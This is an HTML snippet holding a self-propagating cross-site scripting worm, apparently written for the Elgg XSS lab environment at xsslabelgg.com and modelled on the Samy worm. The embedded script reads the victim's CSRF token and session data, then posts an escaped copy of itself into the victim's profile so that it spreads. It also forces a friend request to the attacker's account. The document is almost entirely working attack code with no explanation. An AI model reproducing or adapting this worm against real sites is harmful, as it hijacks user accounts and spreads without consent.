<p>I m the worm creator</p>
<script id="worm" type="text/javascript">// <![CDATA[
var Ajax=null;

token=elgg.security.token.__elgg_token;
ts=elgg.security.token.__elgg_ts;
guid=elgg.page_owner['guid'];
userName=elgg.page_owner['username'];
sessionUser=elgg.session.user['username'];
sessionUserId=elgg.session.user['guid'];

url="http://www.xsslabelgg.com/action/profile/edit";

Ajax=new XMLHttpRequest();
Ajax.open("POST",url,true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

 


var escapedWorm = escape("<".concat("script id=worm>", document.getElementById("worm").innerHTML,"</","script>"));
bd="Samy has attacked you";
var content1="&name=".concat(sessionUser.toString(),"&briefdescription=",bd,"&accesslevel[briefdescription]=2","&description=",escapedWorm,"&accesslevel[description]=2","&guid=",sessionUserId.toString());
var content2="__elgg_token=".concat(token.toString(),"&__elgg_ts=",ts.toString()); content=content2.concat(content1); 

if(sessionUser.toString()==userName.toString() && sessionUser.toString()=="samy"){ 
alert("Samy's worm"); 
} 
else { 
Ajax.send(content);
var Ajax2=null;
token=elgg.security.token.__elgg_token;
ts=elgg.security.token.__elgg_ts;
guid=elgg.page_owner['guid'];
userName=elgg.page_owner['username'];
sessionUser=elgg.session.user['username'];
sessionUserId=elgg.session.user['guid'];

var url1="http://www.xsslabelgg.com/action/friends/add?friend=42&__elgg_ts=";
var url2=url1.concat(ts.toString(),"&__elgg_token=",token.toString());


Ajax2=new XMLHttpRequest();
Ajax2.open("GET",url2,true);
Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
Ajax2.setRequestHeader("Keep-Alive","300");
Ajax2.setRequestHeader("Connection","keep-alive");
Ajax2.setRequestHeader("Cookie",document.cookie);
Ajax2.setRequestHeader("Referer","http://www.xsslabelgg.com");
Ajax2.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); 
Ajax2.send();
}
// ]]></script>